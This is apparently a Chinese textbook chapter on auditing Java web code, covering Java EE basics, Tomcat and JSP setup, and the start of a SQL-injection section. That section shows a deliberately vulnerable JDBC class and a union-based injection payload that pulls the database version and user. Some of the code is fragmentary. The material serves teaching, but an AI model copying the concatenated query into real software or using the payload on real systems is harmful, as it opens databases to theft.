  \u672C\u5355\u5143\u901A\u8FC7\u5BF9YXCMS V1.4.7\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u8BA9\u8BFB\u8005\u4E86\u89E3\u5B8C\u6574CMS\u7684\u5BA1\u8BA1\u6D41\u7A0B\u3002\u5176\u4E2D\u4EE3\u7801\u5BA1\u8BA1\u7684\u51C6\u5907\u5DE5\u4F5C\u5C24\u4E3A\u91CD\u8981\uFF0C\u7136\u540E\u5BF9\u8BE5CMS\u4E2D\u4E0D\u540C\u7684\u529F\u80FD\u70B9\u6F0F\u6D1E\u8FDB\u884C\u4EE3\u7801\u5206\u6790\uFF0C\u5305\u62EC\uFF1A\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3001SQL\u6CE8\u5165\u6F0F\u6D1E\u3001\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u514313 Java\u4EE3\u7801\u5BA1\u8BA1\r
\r
\u4E0EPHP\u4EE3\u7801\u5BA1\u8BA1\u76F8\u6BD4\uFF0CJava\u4EE3\u7801\u6BD4PHP\u4EE3\u7801\u8981\u66F4\u52A0\u590D\u6742\uFF0C Java EE\u4EE3\u7801\u5BA1\u8BA1\u8981\u6C42\u6D4B\u8BD5\u4EBA\u5458\u5BF9Java\u4EE3\u7801\u5177\u6709\u5F88\u5F3A\u7684\u8D70\u8BFB\u80FD\u529B\u3002\u672C\u5355\u5143\u5C06\u8BE6\u89E3\u4ECB\u7ECDJava\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u51E0\u4E2A\u5E38\u89C1\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1ASQL\u6CE8\u5165\u6F0F\u6D1E\u3001XSS\u6F0F\u6D1E\u3001\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3001\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4E24\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECDJava\u4EE3\u7801\u5BA1\u8BA1\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1AJava EE\u4E2D\u57FA\u672C\u77E5\u8BC6\u3001Java\u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840\uFF0C\u5305\u62EC\uFF1AJava\u73AF\u5883\u914D\u7F6E\u3001Tomcat\u5B89\u88C5\u3001Java EE\u9879\u76EE\u90E8\u7F72\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECDJava\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u5E38\u89C1\u6F0F\u6D1E\u6848\u4F8B\uFF0C\u5305\u62EC\uFF1ASQL\u6CE8\u5165\u6F0F\u6D1E\u7684Java\u5BA1\u8BA1\u4E0E\u9632\u5FA1\u3001XSS\u6F0F\u6D1E\u5BA1\u8BA1\u4E0E\u9632\u5FA1\uFF0C\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3001\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image594.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3Java EE\u7684\u57FA\u7840\u77E5\u8BC6\uFF1B\r
\r
\\2.  \u638C\u63E1Java\u4EE3\u7801\u8D70\u8BFB\uFF1B\r
\r
\\3.  \u719F\u6089Java\u4EE3\u7801\u4E2D\u5E38\u89C1\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u6280\u5DE7\u3002\r
\r
## 13.1 Java\u4EE3\u7801\u5BA1\u8BA1\u5165\u95E8\r
\r
### 13.1.1 Java EE\u4ECB\u7ECD\r
\r
Java EE\u662F\u4E00\u5957Java\u7A0B\u5E8F\u4E0E\u5176\u4ED6\u7A0B\u5E8F\u6216\u5E94\u7528\u8FDB\u884C\u4EA4\u4E92\u7684\u4E00\u5957\u89C4\u8303\uFF0C\u5B83\u662FSun\u516C\u53F8\u4E3A\u4F01\u4E1A\u7EA7\u5E94\u7528\u63A8\u51FA\u7684\u6807\u51C6\u5E73\u53F0\uFF0C\u7528\u6765\u5F00\u53D1\u6D4F\u89C8\u5668/\u670D\u52A1\u5668\uFF08B/S\uFF09\u6846\u67B6\u8F6F\u4EF6\uFF0C\u5176\u53EF\u4EE5\u8BA4\u4E3A\u662F\u4E00\u4E2A\u6846\u67B6\uFF0C\u4E5F\u53EF\u4EE5\u8BA4\u4E3A\u662F\u4E00\u79CD\u89C4\u8303\u3002Java EE\u5305\u542B\u7684\u6838\u5FC3\u6280\u672F\u6709\uFF1AJDBC\u3001JNDI\u3001Servlet\u3001JSP\u7B49\u3002\r
\r
l JDBC\uFF08\u6570\u636E\u5E93\u8FDE\u63A5\u6280\u672F\uFF09\r
\r
\u7531Java\u8BED\u8A00\u4E2D\u7528\u6765\u89C4\u8303\u5BA2\u6237\u7AEF\u7A0B\u5E8F\u8BBF\u95EE\u6570\u636E\u5E93\u7684\u5E94\u7528\u7A0B\u5E8F\u63A5\u53E3\uFF0C\u8BE5\u6280\u672F\u7684\u8FDE\u63A5\u6B65\u9AA4\u4E3A\uFF1A\r
\r
  \u6CE8\u518C\u76F8\u5173\u6570\u636E\u5E93\u7684\u9A71\u52A8,\u4E5F\u5C31\u662F\u5C06\u76F8\u5173\u6570\u636E\u5E93\u5382\u5546\u5B9E\u73B0\u7684Driver\u52A0\u8F7D\u5230JVM\u4E2D\uFF1B\r
\r
  \u83B7\u53D6\u6570\u636E\u5E93\u8FDE\u63A5\u5BF9\u8C61Connection\uFF1B\r
\r
  \u83B7\u53D6\u4F20\u8F93\u5668\u5BF9\u8C61Statement\uFF1B\r
\r
  \u7F16\u5199/\u5F97\u5230sql\u8BED\u53E5,\u6267\u884Csql\u8BED\u53E5,\u5F97\u5230\u7ED3\u679C\u96C6\u5BF9\u8C61ResultSet\uFF1B\r
\r
  \u5904\u7406\u7ED3\u679CResult.next()\uFF1B\r
\r
  \u91CA\u653E\u8D44\u6E90\u3002\r
\r
l JNDI\uFF08Java\u547D\u540D\u548C\u76EE\u5F55\u63A5\u53E3\uFF09\r
\r
JNDI\u662F Java \u7684\u4E00\u4E2A\u76EE\u5F55\u670D\u52A1\u5E94\u7528\u7A0B\u5E8F\u754C\u9762\uFF0C\u5B83\u63D0\u4F9B\u4E00\u4E2A\u76EE\u5F55\u7CFB\u7EDF\uFF0C\u5E76\u5C06\u670D\u52A1\u540D\u79F0\u4E0E\u5BF9\u8C61\u5173\u8054\u8D77\u6765\uFF0C\u4ECE\u800C\u4F7F\u5F97\u5F00\u53D1\u4EBA\u5458\u5728\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u53EF\u4EE5\u4F7F\u7528\u540D\u79F0\u6765\u8BBF\u95EE\u5BF9\u8C61\u3002\u7B80\u800C\u8A00\u4E4B\uFF0CJNDI\u53EF\u4EE5\u7528\u914D\u7F6E\u6587\u4EF6\u5B58\u653E\u6570\u636E\uFF0C\u4ECE\u800C\u89E3\u51B3\u4E86\u4EE3\u7801\u95F4\u7684\u53C2\u6570\u8026\u5408\u3002\u914D\u7F6E\u6587\u4EF6\u53EF\u4EE5\u4F7Fxml\u3001properties\u3001yml\u7B49\u5F62\u5F0F\u8FDB\u884C\u89E3\u6790\uFF0C\u4F8B\u5982\uFF1ASpring\u6846\u67B6\u7684\u914D\u7F6E\u6587\u4EF6\u4E3Aapplication.yml\u3002\r
\r
Spring\u6846\u67B6\u914D\u7F6E\u6587\u4EF6\u6587\u4EF6application.yml\u7684JDBC JNDI\u5982\u4E0B\uFF1A\r
\r
\r
\r
spring:\r
\r
 datasource:\r
\r
  driver-class-name: com.mysql.jdbc.Driver     #\u6570\u636E\u5E93\u9A71\u52A8\u540D\u79F0\r
\r
  url:                       #\u6570\u636E\u5E93url\r
\r
jdbc:mysql://localhost:3306/jmccms?useUnicode=true&characterEncoding=utf8&allowMultiQueries=true&serverTimezone=GMT%2B8&useSSL=false\r
\r
  username: root                  #\u6570\u636E\u5E93\u8BBF\u95EE\u8D26\u6237\r
\r
  password: root                  #\u6570\u636E\u5E93\u8BBF\u95EE\u5BC6\u7801\r
\r
\r
\r
l Servlet\r
\r
Servlet\u662F\u7528Java\u7F16\u5199\u7684\u670D\u52A1\u5668\u7AEF\u7A0B\u5E8F\u3002\u5176\u4E3B\u8981\u529F\u80FD\u5728\u4E8E\u4EA4\u4E92\u5730\u6D4F\u89C8\u548C\u4FEE\u6539\u6570\u636E\uFF0C\u751F\u6210\u52A8\u6001Web\u5185\u5BB9\u3002\u7A0B\u5E8F\u4E2D\u7684Servlet\u7C7B\u4F1A\u901A\u8FC7\u7EE7\u627F\u7236\u7C7BHttpServelt\uFF0C\u4ECE\u800C\u91CD\u5199\u4E86HTTP\u7684GET\u65B9\u6CD5\uFF0C\u5E76\u5BF9\u5176\u8FDB\u884C\u76F8\u5E94\u5904\u7406\u3002\u4E0B\u9762\u6848\u4F8B\u7ED9\u51FA\u4E86\u5904\u7406\u8BF7\u6C42http://ip/test\u7684Servlet\u7C7B\u4EE3\u7801\uFF1A\r
\r
\r
\r
@WebServlet("/test")                //\u5904\u7406\u8BF7\u6C42\u4E3Ahttp://ip/test\r
\r
public class Servlet extends **HttpServlet** { //\u5B9A\u4E49Servelt\u7C7B\u5B9E\u73B0HttpServlet\u63A5\u53E3\r
\r
  @Override\r
\r
  protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    request.setCharacterEncoding("utf-8");\r
\r
  }\r
\r
public void **doGet**(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {              //\u5BA2\u6237\u7AEFget\u8BF7\u6C42\r
\r
if((username != null)&&(username.trim().equals("jsp"))) {\r
 \u3000\u3000\u3000if((pwd != null)&&(pwd.trim().equals("1"))) {\r
 \u3000\u3000\u3000\u3000\u3000session.setAttribute("account", account);\r
 \u3000\u3000\u3000\u3000\u3000String login_suc = "success.jsp";\r
\r
**//\u5982\u679C\u7528\u6237\u540D\u5BC6\u7801\u6B63\u786E\u5219\u8DF3\u8F6C\u5230success.jsp\u9875\u9762**\r
 \u3000\u3000\u3000\u3000\u3000**resp.sendRedirect(login_suc); \r
** \u3000\u3000\u3000\u3000\u3000\u3000\u3000return;\r
 \u3000\u3000\u3000\u3000\u3000}}}\r
\r
\u2026\u7701\u7565\u2026\r
\r
}\r
\r
\r
\r
l JSP\r
\r
JSP\u662F\u7531Sun\u516C\u53F8\u4E3B\u5BFC\u521B\u5EFA\u7684\u4E00\u79CD\u52A8\u6001\u7F51\u9875\u6280\u672F\u6807\u51C6\uFF0C\u5B83\u5176\u5B9E\u662FServlet\u7684\u4E00\u79CD\u7279\u6B8A\u5F62\u5F0F\u3002JSP\u90E8\u7F72\u4E8E\u7F51\u7EDC\u670D\u52A1\u5668\u4E0A\uFF0C\u53EF\u4EE5\u54CD\u5E94\u5BA2\u6237\u7AEF\u53D1\u9001\u7684\u8BF7\u6C42\uFF0C\u5E76\u6839\u636E\u8BF7\u6C42\u5185\u5BB9\u52A8\u6001\u5730\u751F\u6210HTML\u3001XML\u6216\u5176\u4ED6\u683C\u5F0F\u6587\u6863\u7684Web\u7F51\u9875\uFF0C\u7136\u540E\u8FD4\u56DE\u7ED9\u8BF7\u6C42\u8005\u3002\r
\r
### 13.1.2 Java\u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840\r
\r
\uFF081\uFF09   \u5B89\u88C5\u4E0E\u914D\u7F6EJava\u73AF\u5883\u53D8\u91CF\r
\r
\u5B89\u88C5\u4E0E\u914D\u7F6EJava\u73AF\u5883\u662F\u8FDB\u884C\u7A0B\u5E8F\u5F00\u53D1\u3001\u4EE3\u7801\u5BA1\u8BA1\u7684\u51C6\u5907\u5DE5\u4F5C\u3002\u9700\u8981\u4ECE\u5B98\u7F51\u4E0B\u8F7DJDK\u5B89\u88C5\u5305\uFF08Java\u6807\u51C6\u5F00\u53D1\u5305\uFF09\uFF0C\u7528\u6237\u9700\u6839\u636E\u4E2A\u4EBA\u8BA1\u7B97\u673A\u7684\u7CFB\u7EDF\u7248\u672C\u9009\u62E9\u5B89\u88C5\u3002\u4E3A\u4E86\u8BA9\u8BA1\u7B97\u673A\u8FDE\u63A5\u5230Java\u7684\u5B89\u88C5\u8DEF\u5F84\uFF0C\u9700\u8981\u5BF9\u8BE5\u8BA1\u7B97\u673A\u914D\u7F6E\u76F8\u5E94\u7684\u73AF\u5883\u53D8\u91CF\uFF0C\u7528\u6237\u901A\u8FC7\u70B9\u51FB\u201C\u6211\u7684\u7535\u8111\u201D->\u201C\u5C5E\u6027\u201D->\u201C\u9AD8\u7EA7\u7CFB\u7EDF\u8BBE\u7F6E\u201D->\u201C\u73AF\u5883\u53D8\u91CF\u201D\u8FDB\u884C\u914D\u7F6E\u3002\u5982\u56FE13-1\u6240\u793A\u3002\u914D\u7F6E\u7684\u73AF\u5883\u53D8\u91CF\u53C2\u6570\u5305\u62EC\uFF1AJAVA_HOME\u3001PATH\u3001CLASSPATH\u3002\r
\r
![http://www.runoob.com/wp-content/uploads/2013/12/java-win2.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image596.jpg)\r
\r
\u56FE13-1 \u73AF\u5883\u53D8\u91CF\u56FE\r
\r
\uFF082\uFF09   Java\u670D\u52A1\u5668\u2014\u2014Tomcat\r
\r
\u5E38\u89C1\u7684Java\u670D\u52A1\u5668\uFF1ATomcat\u3001Weblogic\u3001JBoss\u3001GlassFish\u3001Jetty\u3001Resin\u3001IBM Websphere\u7B49\u3002\r
\r
Tomcat\u670D\u52A1\u5668\u662F\u4E00\u4E2A\u514D\u8D39\u5F00\u6E90\u7684Web\u5E94\u7528\u670D\u52A1\u5668\uFF0C\u5C5E\u4E8E\u8F7B\u91CF\u7EA7\u5E94\u7528\u670D\u52A1\u5668\uFF0C\u5728\u4E2D\u5C0F\u578B\u7CFB\u7EDF\u548C\u5E76\u53D1\u8BBF\u95EE\u7B49\u5F88\u591A\u7684\u573A\u5408\u4E0B\u88AB\u666E\u904D\u4F7F\u7528\u3002\u540C\u65F6\uFF0C\u5B83\u4E5F\u662F\u5F00\u53D1\u548C\u8C03\u8BD5JSP\u7A0B\u5E8F\u7684\u9996\u9009\u3002Tomcat\u5B89\u88C5\u5305\u53EF\u4EE5\u4ECEApache\u5B98\u7F51\u8FDB\u884C\u4E0B\u8F7D\uFF0C\u89E3\u538B\u540E\u5176\u76EE\u5F55\u7ED3\u6784\u5982\u886813-1\u6240\u793A\u3002\r
\r
\u886813-1 \u76EE\u5F55\u7ED3\u6784\u8868\r
\r
| **\u76EE\u5F55** | **\u8BF4\u660E**                                             |\r
| -------- | ---------------------------------------------------- |\r
| /bin     | \u5B58\u653E\u5404\u79CD\u5E73\u53F0\u4E0B\u7528\u4E8E\u542F\u52A8\u548C\u505C\u6B62Tomcat\u7684\u547D\u4EE4\u6587\u4EF6         |\r
| /conf    | \u5B58\u653Etomcat\u7684\u914D\u7F6E\u6587\u4EF6                                 |\r
| /lib     | \u5B58\u653Etomcat\u670D\u52A1\u5668\u6240\u9700\u7684\u5404\u79CDJAR\u6587\u4EF6                    |\r
| /logs    | \u5B58\u5728tomcat\u7684\u65E5\u5FD7\u6587\u4EF6                                 |\r
| /temp    | tomcat\u8FD0\u884C\u65F6\u7528\u4E8E\u5B58\u653E\u4E34\u65F6\u6587\u4EF6                         |\r
| /webapps | \u5F53\u53D1\u5E03web\u5E94\u7528\u65F6\uFF0C\u9ED8\u8BA4\u4F1A\u5C06Web\u5E94\u7528\u7684\u6587\u4EF6\u53D1\u5E03\u5230\u6B64\u76EE\u5F55\u4E2D |\r
| /work    | tomcat\u628A\u7531JSP\u751F\u4EA7\u7684Servlet\u653E\u4E8E\u6B64\u76EE\u5F55\u4E0B               |\r
\r
\u5728\u90E8\u7F72Web\u5E94\u7528\u8FC7\u7A0B\u4E2D\uFF0C\u4E00\u822C\u8981\u5C06Web\u7A0B\u5E8F\u90E8\u7F72\u5230/webapps\u76EE\u5F55\u4E0B\uFF0C\u901A\u8FC7\u8FD0\u884CTomcat\u7684/bin/startup\u811A\u672C\u4ECE\u800C\u542F\u52A8tomcat\u670D\u52A1\u5668\uFF0C\u7136\u540E\u901A\u8FC7\u6D4F\u89C8\u5668\u8BBF\u95EEhttp://localhost:8080\u8BBF\u95EEtomcat\u9996\u9875\uFF0C\u5982\u56FE13-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image598.jpg)\r
\r
\u56FE13-2 Tomcat\u9996\u9875\u56FE\r
\r
\uFF083\uFF09   JSP\u52A8\u6001\u7F51\u7AD9\u642D\u5EFA\r
\r
\u56FE13-3\u4E3AJSP\u52A8\u6001\u7F51\u7AD9\u5F00\u53D1\u6D41\u7A0B\uFF0C\u5176\u4E3B\u8981\u4ECB\u7ECD\u4E86\u642D\u5EFAJSP\u7684\u8BE6\u7EC6\u65B9\u6CD5\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
l \u901A\u8FC7IDEA\u521B\u5EFAmaven\u9879\u76EE\u3002\r
\r
l \u5728pom.xml\u6587\u4EF6\uFF08Maven\u9879\u76EE\u7684\u7248\u672C\u63A7\u5236\u6587\u4EF6\uFF09\u4E2D\u6DFB\u52A0\u4F9D\u8D56\uFF0C\u4F7F\u5176\u652F\u6301Servlet\u5904\u7406\u3002\r
\r
l \u65B0\u5EFALoginServlet.java\u6587\u4EF6\uFF08\u83B7\u53D6\u8BF7\u6C42\u53C2\u6570\u5E76\u8FDB\u884C\u4E1A\u52A1\u5904\u7406\u64CD\u4F5C\uFF09\u3002\r
\r
l \u5728web.xml\u6587\u4EF6\u4E2D\u6DFB\u52A0Servlet\u3001JSP\u9875\u9762\u7528\u4E8E\u8BF7\u6C42\uFF08\u5C06\u4E0A\u8FF0\u521B\u5EFA\u7684java\u6587\u4EF6\u4E0E\u8BF7\u6C42\u8DEF\u5F84\u8FDB\u884C\u6620\u5C04\uFF09\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image600.jpg)\r
\r
\u56FE13-3 JSP\u52A8\u6001\u7F51\u7AD9\u5F00\u53D1\u6D41\u7A0B\u56FE\r
\r
\u901A\u8FC7IDEA\u521B\u5EFAMaven\u9879\u76EE\uFF0C\u5E76\u5728pom.xml\u6587\u4EF6\u4E2D\u6DFB\u52A0servelt\u3001JSP\u3001JSTL\u7684\u4F9D\u8D56\u3002\u6DFB\u52A0\u7684\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<!\u2014Servlet\u4F9D\u8D56 -->\r
\r
\u200B    <dependency>\r
\r
\u200B      <groupId>javax.servlet</groupId>\r
\r
\u200B      <artifactId>javax.servlet-api</artifactId>\r
\r
\u200B      <version>3.1.0</version>\r
\r
\u200B      <scope>provided</scope>\r
\r
\u200B    </dependency>\r
\r
\u200B    <!-- JSP\u4F9D\u8D56-->\r
\r
\u200B    <dependency>\r
\r
\u200B      <groupId>javax.servlet.jsp</groupId>\r
\r
\u200B      <artifactId>jsp-api</artifactId>\r
\r
\u200B      <version>2.2</version>\r
\r
\u200B      <scope>provided</scope>\r
\r
\u200B    </dependency>\r
\r
\u200B    <!-- JSTL\u4F9D\u8D56-->\r
\r
\u200B    <dependency>\r
\r
\u200B      <groupId>javax.servlet</groupId>\r
\r
\u200B      <artifactId>jstl</artifactId>\r
\r
\u200B      <version>1.2</version>\r
\r
\u200B      <scope>runtime</scope>\r
\r
\u200B    </dependency>\r
\r
\r
\r
\u6DFB\u52A0\u524D\u53F0\u9875\u9762index.jsp\u4EE3\u7801\uFF0C\u672C\u5C0F\u8282\u4EE5\u767B\u5F55\u529F\u80FD\u7684\u8868\u5355\u4E3A\u4F8B\uFF0C\u8BE5JSP\u9875\u9762\u53D1\u9001HTTP\u7684POST\u8BF7\u6C42\u5C06\u53C2\u6570\u7528\u6237\u540D\uFF08username\uFF09\u548C\u5BC6\u7801\uFF08password\uFF09\u4F20\u9012\u81F3\u540E\u53F0Servlet\u5904\u7406\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<body>\r
\r
  <FORM method="post" action="login">\r
\r
\u200B    Username:<input type="text" name="username" /><br /> \r
\r
\u200B    Password:<input type="password" name="password" /><br /> \r
\r
\u200B    <input type="submit" value="login" />\r
\r
  </FORM>\r
\r
</body>\r
\r
\r
\r
\u65B0\u5EFA\u5904\u7406\u4E0A\u8FF0index.jsp\u9875\u9762\u7684LoginServlet.java\u4EE3\u7801\u6587\u4EF6\uFF0C\u901A\u8FC7\u96C6\u6210HttpServlet\u7C7B\uFF0C\u5E76\u91CD\u5199doGet\u548CdoPost\u65B9\u6CD5\uFF0C\u901A\u8FC7request\u5BF9\u8C61\u83B7\u53D6\u53C2\u6570username\u548Cpassword\u3002\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public class LoginServlet extends HttpServlet{\r
\r
  @Override\r
\r
  protected void doGet(HttpServletRequest req, HttpServletResponse resp)\r
\r
\u200B      throws ServletException, IOException {\r
\r
\u200B    **String username = req.getParameter("username");**\r
\r
\u200B    **String password = req.getParameter("password");**\r
\r
\u200B    //\u8BBE\u7F6E\u8FD4\u56DE\u6570\u636E\u7684\u7F16\u7801\r
\r
\u200B    resp.setContentType("text/html;charset=UTF-8");\r
\r
\u200B    resp.getWriter().print("\u767B\u9646\u6210\u529F");\r
\r
  }\r
\r
  @Override\r
\r
  protected void doPost(HttpServletRequest req, HttpServletResponse resp)\r
\r
\u200B      throws ServletException, IOException {\r
\r
\u200B    doGet(req, resp);//\u7ED9doGet\u5904\u7406\r
\r
  }\r
\r
}\r
\r
\r
\r
\u6700\u540E\u5BF9\u7F51\u7AD9\u7684web.xml\u6587\u4EF6\u8FDB\u884C\u4FEE\u6539\uFF0C\u5C06\u4E0A\u8FF0\u521B\u5EFA\u7684index.jsp\u6587\u4EF6\u3001LoginServlet.java\u6587\u4EF6\u3001URL\u8DEF\u5F84\u8FDB\u884C\u6620\u5C04\uFF0Cweb.xml\u6587\u4EF6\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<welcome-file-list>\r
\r
  **<welcome-file>index.jsp</welcome-file>   <!\u2014\u6B22\u8FCE\u6587\u4EF6\u5217\u8868\u4E3Aindex.jsp-->**\r
\r
 </welcome-file-list>\r
\r
 <servlet>\r
\r
   **<servlet-name> LoginServlet </servlet-name>      <!\u2014servlet****\u540D\u79F0-->**\r
\r
  **<servlet-class>LoginServlet</servlet-class> <!\u2014servlet\u7C7B\uFF0C\u8BE5\u540D\u79F0\u5BF9\u5E94\u4E0A\u6587\u7684LoginServlet.java\u6587\u4EF6-->**\r
\r
 </servlet>\r
\r
 <servlet-mapping>\r
\r
  **<servlet-name> LoginServlet </servlet-name>      <!\u2014servlet\u540D\u79F0-->**\r
\r
  **<url-pattern>/login</url-pattern>        <!\u2014servlet\u5BF9\u5E94\u7684\u8DEF\u5F84-->**\r
\r
 </servlet-mapping>\r
\r
\r
\r
## 13.2 Java\u4EE3\u7801\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\r
\r
\u4E0EPHP\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u7C7B\u4F3C\uFF0CJava\u4EE3\u7801\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u540C\u6837\u7531\u4E8E\u4EE5\u4E0B\u51E0\u70B9\u5F15\u8D77\uFF1A\r
\r
l \u4F20\u9012\u7684\u53C2\u6570\u7528\u6237\u53EF\u63A7\uFF1B\r
\r
l \u7CFB\u7EDF\u672A\u5BF9\u4F20\u5165\u540E\u53F0\u7684\u53C2\u6570\u8FDB\u884C\u7279\u6B8A\u5B57\u7B26\u8FC7\u6EE4\uFF1B\r
\r
l SQL\u8BED\u53E5\u4EE5\u62FC\u63A5\u5F62\u5F0F\u6267\u884C\u3002\r
\r
Java EE\u7F51\u7AD9\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u8FDE\u63A5\u6570\u636E\u5E93\u7684\u65B9\u6CD5\u5305\u62EC\uFF1AJDBC\u3001Mybatis\u3001Hibernate\uFF0C\u7531\u4E8E\u5176\u4F7F\u7528\u7684\u6846\u67B6\u6709\u6240\u533A\u522B\uFF0C\u4ECE\u800C\u5BFC\u81F4\u5176\u5B58\u5728\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u5F62\u5F0F\u4E5F\u4E0D\u5C3D\u76F8\u540C\uFF0C\u672C\u5C0F\u8282\u5C06\u7ED9\u51FA\u5E38\u89C1\u6846\u67B6\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
### 13.2.1 JDBC\u7684SQL\u6CE8\u5165\r
\r
1.JDBC\u7684SQL\u6CE8\u5165\u6848\u4F8B\r
\r
SQL\u6CE8\u5165\u4EA7\u751F\u7684\u539F\u56E0\u662F\u62FC\u51D1SQL\uFF0C\u7EDD\u5927\u591A\u6570\u7A0B\u5E8F\u5458\u5728\u5F00\u53D1\u65F6\u5E76\u4E0D\u4F1A\u53BB\u5173\u6CE8SQL\u8BED\u53E5\u6700\u7EC8\u662F\u600E\u6837\u8FD0\u884C\u7684\uFF0C\u66F4\u4E0D\u4F1A\u53BB\u5173\u6CE8SQL\u6267\u884C\u7684\u5B89\u5168\u6027\u3002\u8FD9\u5C06\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u53C2\u6570\u62FC\u63A5\u540E\u53F0SQL\u8BED\u53E5\u5E76\u6267\u884C\u3002JDBC\u7684SQL\u6CE8\u5165\u7684\u5178\u578B\u62FC\u63A5\u65B9\u5F0F\u4E3A\u4F7F\u7528\u52A0\u53F7\u201C+\u201D\uFF0C\u4F8B\u5982\uFF1A"SELECT * from corps where id = "+id;\r
\r
\u4E0B\u9762\u4EE3\u7801\u529F\u80FD\u4E3A\u901A\u8FC7\u53C2\u6570id\u67E5\u8BE2\u4EA7\u54C1\u7684\u4FE1\u606F\u9875\u9762\u3002\u5176\u4F7F\u7528JDBC\u8FDE\u63A5\u6570\u636E\u5E93\u4E14\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\r
\r
public class JDBCSqlInjectionTest {\r
\r
  public static void sqlInjectionTest(String id){\r
\r
\u200B    String MYSQLURL = "jdbc:mysql://localhost:3306/wooyun?user=root&password=caonimei&useUnicode=true&characterEncoding=utf8&autoReconnect=true";         //Mysql\u8FDE\u63A5\u5B57\u7B26\u4E32\r
\r
\u200B    **String sql = "SELECT \\* from corps where id = "+id;//****\u62FC\u63A5SQL\u67E5\u8BE2\u8BED\u53E5**\r
\r
\u200B    try {\r
\r
\u200B      Class.forName("com.mysql.jdbc.Driver");     //\u52A0\u8F7DMYSQL\u9A71\u52A8\r
\r
\u200B      Connection conn = DriverManager.getConnection(MYSQLURL);//\u83B7\u53D6\u6570\u636E\u5E93\u8FDE\u63A5\r
\r
\u200B       **PreparedStatement pstt = conn.prepareStatement(sql);**//\u6267\u884CSQL\u8BED\u53E5\r
\r
\u200B      **ResultSet rs = pstt.executeQuery();**\r
\r
\u200B      while(rs.next()){                  //\u7ED3\u679C\u904D\u5386\r
\r
\u200B     System.out.println("ID:"+rs.getObject("id"));//ID\r
\r
\u200B     System.out.println("\u5382\u5546:"+rs.getObject("corps_name"));//\u8F93\u51FA\u5382\u5546\u540D\u79F0\r
\r
\u200B     System.out.println("\u4E3B\u7AD9"+rs.getObject("corps_url")); //\u5382\u5546URL}\r
\r
\u200B      rs.close();                    //\u5173\u95ED\u67E5\u8BE2\u7ED3\u679C\u96C6\r
\r
\u200B      pstt.close();               //\u5173\u95EDPreparedStatement\r
\r
\u200B      conn.close();                    //\u5173\u95ED\u6570\u636E\u8FDE\u63A5\r
\r
\u200B    } catch (ClassNotFoundException e) {\r
\r
\u200B      e.printStackTrace();\r
\r
\u200B    } catch (SQLException e) {\r
\r
\u200B      e.printStackTrace();\r
\r
\u200B    }}\r
\r
  public static void main(String[] args) {\r
\r
\u200B    sqlInjectionTest("**2 and 1=2 union select version(),user(),database(),5** ");                            //\u67E5\u8BE2id\u4E3A2\u7684\u5382\u5546\r
\r
  }}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4E1A\u52A1\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u4F7F\u7528\u53D8\u91CFid\u62FC\u63A5SQL\u8BED\u53E5"SELECT * from corps where id = "+id\uFF1B\u3002\r
\r
l \u52A0\u8F7DMySQL\u9A71\u52A8com.mysql.jdbc.Driver\u3002\r
\r
l \u6267\u884CSQL\u8BED\u53E5\u5C06\u7ED3\u679C\u8FDB\u884C\u904D\u5386\u5E76\u6253\u5370\u3002\r
\r
l \u5173\u95ED\u6570\u636E\u5E93\u8FDE\u63A5\u4E0E\u9A71\u52A8\u8D44\u6E90\u3002\r
\r
2.\u6F0F\u6D1E\u5206\u6790\r
\r
